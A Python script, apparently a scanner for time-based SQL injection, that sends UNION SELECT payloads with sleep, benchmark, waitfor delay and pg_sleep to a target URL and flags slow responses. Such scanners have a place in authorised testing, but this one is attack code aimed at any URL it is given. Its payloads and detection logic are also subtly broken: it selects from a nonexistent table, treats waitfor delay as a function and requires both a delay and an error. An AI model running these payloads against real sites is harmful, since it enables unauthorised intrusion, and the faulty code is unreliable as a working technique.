import requests
import re
import time

def test_sql_injection(url):
    # Define a list of common database query keywords to use in the UNION SELECT attack
    query_keywords = ['SELECT', 'FROM', 'WHERE', 'JOIN', 'LIMIT']

    # Define a list of time delay functions to use in the attack
    time_functions = ['sleep', 'benchmark', 'waitfor delay', 'pg_sleep']

    # Add a single quote to the end of the URL to test for SQL injection
    url_injection = url + "'"

    # Loop over the query keywords and time delay functions to create a time-based payload
    for keyword in query_keywords:
        for function in time_functions:
            # Use the non-existent_table to ensure that the query returns a single row
            payload = f"' UNION ALL SELECT {keyword}, CASE WHEN ({function}(10)) THEN 'a' ELSE 'b' END FROM information_schema.columns WHERE table_name = 'nonexistent_table';--"

            # Make an HTTP GET request with the injection and payload
            start_time = time.time()
            r = requests.get(url_injection, params={'id': payload})
            end_time = time.time()

            # Check the response time to determine if the injection was successful
            elapsed_time = end_time - start_time

            # Check the response for signs of a successful SQL injection attack
            if elapsed_time > 10 and re.search(r"\berror\b", r.text, re.IGNORECASE):
                print(f"SQL injection vulnerability detected with time delay function: {function}, query keyword: {keyword}")
                print(f"Payload: {payload}")
                print(f"Response time: {elapsed_time}")
                print(f"Response content: {r.text}")
            else:
                print(f"No SQL injection vulnerabilities detected with time delay function: {function}, query keyword: {keyword}")
